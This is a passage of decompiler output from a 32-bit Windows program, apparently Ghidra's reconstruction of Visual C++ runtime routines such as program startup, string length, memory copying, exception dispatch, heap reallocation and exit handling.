      puVar5 = puVar10;
    } while (cVar6 != param_2[1]);
    do {
      if (pcVar8[2] == '\0') {
        return puVar10;
      }
      if (*(char *)(uint *)((int)puVar5 + 2) != pcVar8[2]) break;
      pcVar1 = pcVar8 + 3;
      if (*pcVar1 == '\0') {
        return puVar10;
      }
      pcVar2 = (char *)((int)puVar5 + 3);
      pcVar8 = pcVar8 + 2;
      puVar5 = (uint *)((int)puVar5 + 2);
    } while (*pcVar1 == *pcVar2);
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  DWORD DVar1;
  int iVar2;
  undefined4 uVar3;
  uint uVar4;
  HMODULE pHVar5;
  undefined4 uVar6;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  undefined4 *local_18;
  void *pvStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0040d2e8;
  puStack_10 = &LAB_00409b74;
  pvStack_14 = ExceptionList;
  local_1c = &stack0xffffff88;
  ExceptionList = &pvStack_14;
  DVar1 = GetVersion();
  _DAT_0041230c = DVar1 >> 8 & 0xff;
  _DAT_00412308 = DVar1 & 0xff;
  _DAT_00412304 = _DAT_00412308 * 0x100 + _DAT_0041230c;
  _DAT_00412300 = DVar1 >> 0x10;
  iVar2 = FUN_0040751b(0);
  if (iVar2 == 0) {
    FUN_00404f1b(0x1c);
  }
  local_8 = 0;
  FUN_004099c0();
  DAT_0041391c = GetCommandLineA();
  DAT_004122d8 = FUN_0040988e();
  FUN_00409641();
  FUN_00409588();
  FUN_00405ea8();
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  uVar3 = FUN_00409530();
  if ((local_60.dwFlags & 1) == 0) {
    uVar4 = 10;
  }
  else {
    uVar4 = (uint)local_60.wShowWindow;
  }
  uVar6 = 0;
  pHVar5 = GetModuleHandleA((LPCSTR)0x0);
  uVar3 = FUN_00403380(pHVar5,uVar6,uVar3,uVar4);
  FUN_00405ed5(uVar3);
  FUN_004093ac(*(undefined4 *)*local_18,local_18);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2003 Release

void __cdecl __amsg_exit(int param_1)

{
  if (DAT_004122e0 == 1) {
    FUN_00409c4c();
  }
  FUN_00409c85(param_1);
  (*(code *)PTR___exit_0040f8c0)(0xff);
  return;
}



void FUN_00404f1b(undefined4 param_1)

{
  if (DAT_004122e0 == 1) {
    FUN_00409c4c();
  }
  FUN_00409c85(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(0xff);
}



// Library Function - Single Match
//  _strlen
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00404f93;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00404f93:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



undefined4 * FUN_00404fe0(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    param_2 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar1 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar1 & 3) == 0) {
      uVar3 = param_3 >> 2;
      if (uVar3 < 8) goto LAB_004051a0;
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar1 = *param_2;
        param_2 = param_2 + -1;
        puVar1 = puVar1 + -1;
      }
      switch(param_3 & 3) {
      case 1:
        goto switchD_004051c4_caseD_1;
      case 2:
        goto switchD_004051c4_caseD_2;
      case 3:
        goto switchD_004051c4_caseD_3;
      }
    }
    else {
      switch(param_3) {
      case 0:
        break;
      case 1:
switchD_004051c4_caseD_1:
        *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
        return param_1;
      case 2:
switchD_004051c4_caseD_2:
        *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
        *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
        return param_1;
      case 3:
switchD_004051c4_caseD_3:
        *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
        *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
        *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
        return param_1;
      default:
        param_3 = param_3 - ((uint)puVar1 & 3);
        switch((uint)puVar1 & 3) {
        case 1:
          *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
          param_2 = (undefined4 *)((int)param_2 + -1);
          uVar3 = param_3 >> 2;
          puVar1 = (undefined4 *)((int)puVar1 - 1);
          if (uVar3 < 8) {
LAB_004051a0:
                    // WARNING: Could not recover jumptable at 0x004051a2. Too many branches
                    // WARNING: Treating indirect jump as call
            puVar1 = (undefined4 *)(*(code *)(&PTR_LAB_00405270)[-uVar3])();
            return puVar1;
          }
          for (; uVar3 != 0; uVar3 = uVar3 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + -1;
            puVar1 = puVar1 + -1;
          }
          switch(param_3 & 3) {
          case 1:
            goto switchD_004051c4_caseD_1;
          case 2:
            goto switchD_004051c4_caseD_2;
          case 3:
            goto switchD_004051c4_caseD_3;
          }
          break;
        case 2:
          *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
          uVar3 = param_3 >> 2;
          *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
          param_2 = (undefined4 *)((int)param_2 + -2);
          puVar1 = (undefined4 *)((int)puVar1 - 2);
          if (uVar3 < 8) goto LAB_004051a0;
          for (; uVar3 != 0; uVar3 = uVar3 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + -1;
            puVar1 = puVar1 + -1;
          }
          switch(param_3 & 3) {
          case 1:
            goto switchD_004051c4_caseD_1;
          case 2:
            goto switchD_004051c4_caseD_2;
          case 3:
            goto switchD_004051c4_caseD_3;
          }
          break;
        case 3:
          *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
          *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
          uVar3 = param_3 >> 2;
          *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
          param_2 = (undefined4 *)((int)param_2 + -3);
          puVar1 = (undefined4 *)((int)puVar1 - 3);
          if (uVar3 < 8) goto LAB_004051a0;
          for (; uVar3 != 0; uVar3 = uVar3 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + -1;
            puVar1 = puVar1 + -1;
          }
          switch(param_3 & 3) {
          case 1:
            goto switchD_004051c4_caseD_1;
          case 2:
            goto switchD_004051c4_caseD_2;
          case 3:
            goto switchD_004051c4_caseD_3;
          }
        }
      }
    }
    return param_1;
  }
  puVar1 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar2 = param_3 >> 2;
    if (uVar2 < 8) goto LAB_0040503c;
    for (; uVar2 != 0; uVar2 = uVar2 - 1) {
      *puVar1 = *param_2;
      param_2 = param_2 + 1;
      puVar1 = puVar1 + 1;
    }
    switch(param_3 & 3) {
    case 1:
      goto switchD_00405034_caseD_1;
    case 2:
      goto switchD_00405034_caseD_2;
    case 3:
      goto switchD_00405034_caseD_3;
    }
  }
  else {
    switch(param_3) {
    case 0:
      break;
    case 1:
switchD_00405034_caseD_1:
      *(undefined *)puVar1 = *(undefined *)param_2;
      return param_1;
    case 2:
switchD_00405034_caseD_2:
      *(undefined *)puVar1 = *(undefined *)param_2;
      *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
      return param_1;
    case 3:
switchD_00405034_caseD_3:
      *(undefined *)puVar1 = *(undefined *)param_2;
      *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
      *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
      return param_1;
    default:
      uVar3 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar2 = uVar3 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar1 = (undefined4 *)((int)param_1 + 3);
        if (uVar2 < 8) {
LAB_0040503c:
                    // WARNING: Could not recover jumptable at 0x0040503c. Too many branches
                    // WARNING: Treating indirect jump as call
          puVar1 = (undefined4 *)(*(code *)(&PTR_LAB_004050bc)[uVar2])();
          return puVar1;
        }
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_00405034_caseD_1;
        case 2:
          goto switchD_00405034_caseD_2;
        case 3:
          goto switchD_00405034_caseD_3;
        }
        break;
      case 2:
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar2 = uVar3 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar1 = (undefined4 *)((int)param_1 + 2);
        if (uVar2 < 8) goto LAB_0040503c;
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_00405034_caseD_1;
        case 2:
          goto switchD_00405034_caseD_2;
        case 3:
          goto switchD_00405034_caseD_3;
        }
        break;
      case 3:
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar2 = uVar3 >> 2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        puVar1 = (undefined4 *)((int)param_1 + 1);
        if (uVar2 < 8) goto LAB_0040503c;
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_00405034_caseD_1;
        case 2:
          goto switchD_00405034_caseD_2;
        case 3:
          goto switchD_00405034_caseD_3;
        }
      }
    }
  }
  return param_1;
}



undefined4
FUN_00405315(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,int *param_5,
            int param_6,undefined4 param_7,uint param_8)

{
  undefined4 uVar1;
  
  if (*param_5 != 0x19930520) {
    FUN_00405bb2();
  }
  if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
    if (param_5[3] != 0) {
      if (((*param_1 == -0x1f928c9d) && (0x19930520 < (uint)param_1[5])) &&
         (*(code **)(param_1[7] + 8) != (code *)0x0)) {
        uVar1 = (**(code **)(param_1[7] + 8))
                          (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8 & 0xff);
        return uVar1;
      }
      FUN_004053b0(param_1,param_2,param_3,param_4,param_5,param_8,param_6,param_7);
    }
  }
  else if ((param_5[1] != 0) && (param_6 == 0)) {
    FUN_0040565c(param_2,param_4,param_5,0xffffffff);
  }
  return 1;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_004053b0(int *param_1,int param_2,undefined4 param_3,undefined4 param_4,int param_5,
                 char param_6,undefined4 param_7,undefined4 param_8)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int *piVar4;
  uint local_1c;
  undefined4 local_18;
  int local_14;
  int local_10;
  int local_c;
  uint local_8;
  
  local_18 = local_18 & 0xffffff00;
  local_14 = *(int *)(param_2 + 8);
  if ((local_14 < -1) || (*(int *)(param_5 + 4) <= local_14)) {
    FUN_00405bb2();
  }
  piVar3 = DAT_004122e4;
  if (*param_1 == -0x1f928c9d) {
    if (((param_1[4] == 3) && (param_1[5] == 0x19930520)) && (param_1[7] == 0)) {
      if (DAT_004122e4 == (int *)0x0) {
        return;
      }
      param_3 = DAT_004122e8;
      local_18 = CONCAT31(local_18._1_3_,1);
      iVar2 = FUN_00409ec8(DAT_004122e4,1);
      if (iVar2 == 0) {
        FUN_00405bb2();
      }
      param_1 = piVar3;
      if (*piVar3 != -0x1f928c9d) goto LAB_0040552c;
      if (((piVar3[4] == 3) && (piVar3[5] == 0x19930520)) && (piVar3[7] == 0)) {
        FUN_00405bb2();
      }
    }
    iVar2 = local_14;
    if (((*param_1 == -0x1f928c9d) && (param_1[4] == 3)) && (param_1[5] == 0x19930520)) {
      piVar3 = (int *)FUN_00404037(param_5,param_7,local_14,&local_8,&local_1c);
      do {
        if (local_1c <= local_8) {
          if (param_6 == '\0') {
            return;
          }
          FUN_00405a85(param_1,1);
          return;
        }
        if ((*piVar3 == iVar2 || *piVar3 < iVar2) && (iVar2 <= piVar3[1])) {
          iVar1 = piVar3[4];
          for (local_10 = piVar3[3]; iVar2 = local_14, 0 < local_10; local_10 = local_10 + -1) {
            piVar4 = *(int **)(param_1[7] + 0xc);
            for (local_c = *piVar4; 0 < local_c; local_c = local_c + -1) {
              piVar4 = piVar4 + 1;
              iVar2 = FUN_004055ff(iVar1,*piVar4,param_1[7]);
              if (iVar2 != 0) {
                FUN_00405710(param_1,param_2,param_3,param_4,param_5,iVar1,*piVar4,piVar3,param_7,
                             param_8,local_18);
                iVar2 = local_14;
                goto LAB_0040550c;
              }
            }
            iVar1 = iVar1 + 0x10;
          }
        }
LAB_0040550c:
        local_8 = local_8 + 1;
        piVar3 = piVar3 + 5;
      } while( true );
    }
  }
LAB_0040552c:
  if (param_6 == '\0') {
    FUN_00405557(param_1,param_2,param_3,param_4,param_5,local_14,param_7,param_8);
    return;
  }
  FUN_00405b5c();
  return;
}



void FUN_00405557(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5,int param_6,undefined4 param_7,undefined4 param_8)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  uint local_c;
  uint local_8;
  
  if ((DAT_004122ec != 0) &&
     (iVar1 = FUN_00403f0e(param_1,param_2,param_3,param_4,param_5,param_7,param_8), iVar1 != 0)) {
    return;
  }
  piVar2 = (int *)FUN_00404037(param_5,param_7,param_6,&local_8,&local_c);
  for (; local_8 < local_c; local_8 = local_8 + 1) {
    if ((*piVar2 <= param_6) && (param_6 <= piVar2[1])) {
      iVar3 = piVar2[3] * 0x10 + piVar2[4];
      iVar1 = *(int *)(iVar3 + -0xc);
      if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
        FUN_00405710(param_1,param_2,param_3,param_4,param_5,iVar3 + -0x10,0,piVar2,param_7,param_8,
                     1);
      }
    }
    piVar2 = piVar2 + 5;
  }
  return;
}



undefined4 FUN_004055ff(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_00405656:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_00405630:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_00405656;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_00405630;
    }
    uVar2 = 0;
  }
  return uVar2;
}



void FUN_0040565c(int param_1,undefined4 param_2,int param_3,int param_4)

{
  int iVar1;
  int iVar2;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_0040d318;
  puStack_10 = &LAB_00409b74;
  local_14 = ExceptionList;
  ExceptionList = &local_14;
  for (iVar2 = *(int *)(param_1 + 8); local_8 = 0xffffffff, iVar2 != param_4;
      iVar2 = *(int *)(*(int *)(param_3 + 8) + iVar2 * 8)) {
    if ((iVar2 < 0) || (*(int *)(param_3 + 4) <= iVar2)) {
      FUN_00405bb2();
    }
    local_8 = 0;
    iVar1 = *(int *)(*(int *)(param_3 + 8) + 4 + iVar2 * 8);
    if (iVar1 != 0) {
      __CallSettingFrame_12(iVar1,param_1,0x103);
    }
  }
  *(int *)(param_1 + 8) = iVar2;
  ExceptionList = local_14;
  return;
}



void FUN_00405710(undefined4 param_1,int param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5,int param_6,int param_7,undefined4 *param_8,undefined4 param_9,
                 int param_10)

{
  int iVar1;
  
  if (param_7 != 0) {
    FUN_004058c1(param_1,param_2,param_6,param_7);
  }
  if (param_10 == 0) {
    param_10 = param_2;
  }
  FUN_00403e10(param_10,param_1);
  FUN_0040565c(param_2,param_4,param_5,*param_8);
  *(int *)(param_2 + 8) = param_8[1] + 1;
  iVar1 = FUN_0040578b(param_1,param_2,param_3,param_5,*(undefined4 *)(param_6 + 0xc),param_9,0x100)
  ;
  if (iVar1 != 0) {
    FUN_00403dce(iVar1,param_2);
  }
  return;
}



undefined4
FUN_0040578b(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6,undefined4 param_7)

{
  undefined4 uVar1;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_0040d328;
  puStack_10 = &LAB_00409b74;
  local_14 = ExceptionList;
  DAT_004122e4 = param_1;
  DAT_004122e8 = param_3;
  local_8 = 1;
  ExceptionList = &local_14;
  uVar1 = FUN_00403e95(param_2,param_4,param_5,param_6,param_7);
  local_8 = 0xffffffff;
  FUN_00405851();
  ExceptionList = local_14;
  return uVar1;
}



void FUN_00405851(void)

{
  int unaff_EBX;
  int unaff_EBP;
  int unaff_ESI;
  int *unaff_EDI;
  
  *(undefined4 *)(unaff_ESI + -4) = *(undefined4 *)(unaff_EBP + -0x28);
  DAT_004122e4 = *(undefined4 *)(unaff_EBP + -0x1c);
  DAT_004122e8 = *(undefined4 *)(unaff_EBP + -0x20);
  if ((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) && (unaff_EDI[5] == 0x19930520)) &&
     ((*(int *)(unaff_EBP + -0x24) == unaff_EBX && (*(int *)(unaff_EBP + -0x2c) != unaff_EBX)))) {
    __abnormal_termination();
    FUN_00405a85();
  }
  return;
}



void FUN_004058c1(int param_1,int param_2,byte *param_3,byte *param_4)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_0040d340;
  puStack_10 = &LAB_00409b74;
  local_14 = ExceptionList;
  if (*(int *)(param_3 + 4) == 0) {
    return;
  }
  if (*(char *)(*(int *)(param_3 + 4) + 8) == '\0') {
    return;
  }
  if (*(int *)(param_3 + 8) == 0) {
    return;
  }
  piVar1 = (int *)(*(int *)(param_3 + 8) + 0xc + param_2);
  local_8 = 0;
  if ((*param_3 & 8) == 0) {
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        ExceptionList = &local_14;
        iVar2 = FUN_00409ec8(*(undefined4 *)(param_1 + 0x18),1);
        if ((iVar2 != 0) && (iVar2 = FUN_00409ee4(piVar1,1), iVar2 != 0)) {
          uVar3 = FUN_00405aec(*(undefined4 *)(param_1 + 0x18),param_4 + 8,
                               *(undefined4 *)(param_4 + 0x14));
          FUN_004041b0(piVar1,uVar3);
          ExceptionList = local_14;
          return;
        }
      }
      else {
        ExceptionList = &local_14;
        iVar2 = FUN_00409ec8(*(undefined4 *)(param_1 + 0x18),1);
        if (((iVar2 != 0) && (iVar2 = FUN_00409ee4(piVar1,1), iVar2 != 0)) &&
           (iVar2 = FUN_00409f00(*(undefined4 *)(param_4 + 0x18)), iVar2 != 0)) {
          if ((*param_4 & 4) != 0) {
            uVar3 = FUN_00405aec(*(undefined4 *)(param_1 + 0x18),param_4 + 8,1);
            FUN_00403e09(piVar1,*(undefined4 *)(param_4 + 0x18),uVar3);
            ExceptionList = local_14;
            return;
          }
          uVar3 = FUN_00405aec(*(undefined4 *)(param_1 + 0x18),param_4 + 8);
          FUN_00403e02(piVar1,*(undefined4 *)(param_4 + 0x18),uVar3);
          ExceptionList = local_14;
          return;
        }
      }
    }
    else {
      ExceptionList = &local_14;
      iVar2 = FUN_00409ec8(*(undefined4 *)(param_1 + 0x18),1);
      if ((iVar2 != 0) && (iVar2 = FUN_00409ee4(piVar1,1), iVar2 != 0)) {
        FUN_004041b0(piVar1,*(undefined4 *)(param_1 + 0x18),*(undefined4 *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          ExceptionList = local_14;
          return;
        }
        iVar2 = *piVar1;
        if (iVar2 == 0) {
          ExceptionList = local_14;
          return;
        }
        goto LAB_0040594f;
      }
    }
  }
  else {
    ExceptionList = &local_14;
    iVar2 = FUN_00409ec8(*(undefined4 *)(param_1 + 0x18),1);
    if ((iVar2 != 0) && (iVar2 = FUN_00409ee4(piVar1,1), iVar2 != 0)) {
      iVar2 = *(int *)(param_1 + 0x18);
      *piVar1 = iVar2;
LAB_0040594f:
      iVar2 = FUN_00405aec(iVar2,param_4 + 8);
      *piVar1 = iVar2;
      ExceptionList = local_14;
      return;
    }
  }
  FUN_00405bb2();
  ExceptionList = local_14;
  return;
}



void FUN_00405a85(int param_1)

{
  int iVar1;
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_0040d350;
  puStack_10 = &LAB_00409b74;
  local_14 = ExceptionList;
  if ((param_1 != 0) && (iVar1 = *(int *)(*(int *)(param_1 + 0x1c) + 4), iVar1 != 0)) {
    local_8 = 0;
    ExceptionList = &local_14;
    FUN_00403e02(*(undefined4 *)(param_1 + 0x18),iVar1);
  }
  ExceptionList = local_14;
  return;
}



int FUN_00405aec(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  
  iVar1 = param_2[1];
  iVar2 = *param_2 + param_1;
  if (-1 < iVar1) {
    iVar2 = iVar2 + *(int *)(*(int *)(iVar1 + param_1) + param_2[2]) + iVar1;
  }
  return iVar2;
}



// WARNING: Restarted to delay deadcode elimination for space: stack
// Library Function - Single Match
//  __CallSettingFrame@12
// 
// Libraries: Visual Studio 2003 Debug, Visual Studio 2003 Release

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



void FUN_00405b5c(void)

{
  void *pvStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_0040d360;
  puStack_10 = &LAB_00409b74;
  pvStack_14 = ExceptionList;
  ExceptionList = &pvStack_14;
  if (DAT_004122f0 != (code *)0x0) {
    local_8 = 1;
    ExceptionList = &pvStack_14;
    (*DAT_004122f0)();
  }
  local_8 = 0xffffffff;
  FUN_00409f18();
  return;
}



void FUN_00405bb2(void)

{
  void *pvStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_0040d378;
  puStack_10 = &LAB_00409b74;
  pvStack_14 = ExceptionList;
  ExceptionList = &pvStack_14;
  if (PTR_FUN_0040f8f4 != (undefined *)0x0) {
    local_8 = 1;
    ExceptionList = &pvStack_14;
    (*(code *)PTR_FUN_0040f8f4)();
  }
  local_8 = 0xffffffff;
  FUN_00405b5c();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void * __thiscall FUN_00405c08(undefined4 param_1_00,LPVOID param_1,uint param_2)

{
  void *pvVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  uint uVar6;
  LPVOID pvVar7;
  undefined4 local_8;
  
  local_8 = param_1_00;
  if (param_1 == (LPVOID)0x0) {
    pvVar1 = _malloc(param_2);
  }
  else {
    if (param_2 == 0) {
      FUN_00404b0a(param_1);
    }
    else {
      uVar6 = param_2;
      if (DAT_00413904 == 3) {
        do {
          pvVar7 = (LPVOID)0x0;
          if (uVar6 < 0xffffffe1) {
            iVar2 = FUN_004075c0(param_1);
            if (iVar2 == 0) {
LAB_00405cff:
              if (uVar6 == 0) {
                uVar6 = 1;
              }
              uVar6 = uVar6 + 0xf & 0xfffffff0;
              pvVar7 = HeapReAlloc(DAT_00413900,0,param_1,uVar6);
            }
            else {
              if (_DAT_004138fc < uVar6) {
LAB_00405cb8:
                if (uVar6 == 0) {
                  uVar6 = 1;
                }
                uVar6 = uVar6 + 0xf & 0xfffffff0;
                pvVar7 = HeapAlloc(DAT_00413900,0,uVar6);
                if (pvVar7 != (LPVOID)0x0) {
                  uVar4 = *(int *)((int)param_1 + -4) - 1;
                  if (uVar6 <= uVar4) {
                    uVar4 = uVar6;
                  }
                  FUN_00404fe0(pvVar7,param_1,uVar4);
                  FUN_004075eb(iVar2,param_1);
                }
              }
              else {
                iVar3 = FUN_00407dc9(iVar2,param_1,uVar6);
                pvVar7 = param_1;
                if (iVar3 == 0) {
                  pvVar7 = (LPVOID)FUN_00407914(uVar6);
                  if (pvVar7 == (LPVOID)0x0) goto LAB_00405cb8;
                  uVar4 = *(int *)((int)param_1 + -4) - 1;
                  if (uVar6 <= uVar4) {
                    uVar4 = uVar6;
                  }
                  FUN_00404fe0(pvVar7,param_1,uVar4);
                  iVar2 = FUN_004075c0(param_1);
                  FUN_004075eb(iVar2,param_1);
                }
                if (pvVar7 == (LPVOID)0x0) goto LAB_00405cb8;
              }
              if (iVar2 == 0) goto LAB_00405cff;
            }
            if (pvVar7 != (LPVOID)0x0) {
              return pvVar7;
            }
          }
          if (DAT_00412364 == 0) {
            return pvVar7;
          }
          iVar2 = FUN_0040878c(uVar6);
        } while (iVar2 != 0);
      }
      else if (DAT_00413904 == 2) {
        if (param_2 < 0xffffffe1) {
          if (param_2 == 0) {
            uVar6 = 0x10;
          }
          else {
            uVar6 = param_2 + 0xf & 0xfffffff0;
          }
        }
        do {
          pvVar7 = (LPVOID)0x0;
          if (uVar6 < 0xffffffe1) {
            pbVar5 = (byte *)FUN_0040831b(param_1,&local_8,&param_2);
            if (pbVar5 == (byte *)0x0) {
              pvVar7 = HeapReAlloc(DAT_00413900,0,param_1,uVar6);
            }
            else {
              if (uVar6 < _DAT_00411994) {
                iVar2 = FUN_004086e3(local_8,param_2,pbVar5,uVar6 >> 4);
                pvVar7 = param_1;
                if (iVar2 == 0) {
                  pvVar7 = (LPVOID)FUN_004083b7(uVar6 >> 4);
                  if (pvVar7 == (LPVOID)0x0) goto LAB_00405ded;
                  uVar4 = (uint)*pbVar5 << 4;
                  if (uVar6 <= (uint)*pbVar5 << 4) {
                    uVar4 = uVar6;
                  }
                  FUN_00404fe0(pvVar7,param_1,uVar4);
                  FUN_00408372(local_8,param_2,pbVar5);
                }
                if (pvVar7 != (LPVOID)0x0) {
                  return pvVar7;
                }
              }
LAB_00405ded:
              pvVar7 = HeapAlloc(DAT_00413900,0,uVar6);
              if (pvVar7 == (LPVOID)0x0) goto LAB_00405e45;
              uVar4 = (uint)*pbVar5 << 4;
              if (uVar6 <= (uint)*pbVar5 << 4) {
                uVar4 = uVar6;
              }
              FUN_00404fe0(pvVar7,param_1,uVar4);
              FUN_00408372(local_8,param_2,pbVar5);
            }
            if (pvVar7 != (LPVOID)0x0) {
              return pvVar7;
            }
          }
LAB_00405e45:
          if (DAT_00412364 == 0) {
            return pvVar7;
          }
          iVar2 = FUN_0040878c(uVar6);
        } while (iVar2 != 0);
      }
      else {
        do {
          pvVar7 = (LPVOID)0x0;
          if (uVar6 < 0xffffffe1) {
            if (uVar6 == 0) {
              uVar6 = 1;
            }
            uVar6 = uVar6 + 0xf & 0xfffffff0;
            pvVar7 = HeapReAlloc(DAT_00413900,0,param_1,uVar6);
            if (pvVar7 != (LPVOID)0x0) {
              return pvVar7;
            }
          }
          if (DAT_00412364 == 0) {
            return pvVar7;
          }
          iVar2 = FUN_0040878c(uVar6);
        } while (iVar2 != 0);
      }
    }
    pvVar1 = (void *)0x0;
  }
  return pvVar1;
}



void FUN_00405ea8(void)

{
  if (DAT_00413918 != (code *)0x0) {
    (*DAT_00413918)();
  }
  FUN_00405f90(&DAT_0040f02c,&DAT_0040f040);
  FUN_00405f90(&DAT_0040f000,&DAT_0040f028);
  return;
}



void FUN_00405ed5(undefined4 param_1)

{
  FUN_00405ef7(param_1,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2003 Release

void __cdecl __exit(int _Code)

{
  FUN_00405ef7(_Code,1,0);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

